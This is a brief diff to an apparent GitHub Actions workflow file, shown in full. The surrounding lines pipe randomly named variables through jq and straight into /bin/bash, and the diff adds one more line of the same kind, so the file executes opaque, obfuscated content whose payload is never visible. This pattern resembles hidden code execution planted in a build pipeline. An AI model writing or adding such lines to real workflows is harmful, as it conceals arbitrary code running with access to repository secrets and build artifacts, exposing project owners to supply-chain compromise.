@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$dtwwz6890" | jq -r .px1 | /bin/bash
           echo $rkmwz37257 | jq -r .m8 | /bin/bash
           printf '%s' "$pmfeg67172" | jq -r .p6753 | /bin/bash
+          printf '%s' "$kru067" | jq -r .t3067 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
